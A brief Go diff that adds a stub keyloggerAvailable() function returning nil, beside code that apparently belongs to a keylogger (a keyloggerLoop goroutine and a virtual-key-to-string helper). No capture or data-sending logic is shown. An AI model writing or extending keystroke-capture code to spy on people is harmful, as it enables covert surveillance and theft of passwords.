@@ -253,6 +253,10 @@ func vkToString(vk int, shift bool) string {
 	return fmt.Sprintf("[0x%02X]", vk)
 }
 
+func keyloggerAvailable() error {
+	return nil
+}
+
 func keyloggerLoop() {
 	debugLog("keylogger goroutine started")
 	var prev [256]uint16
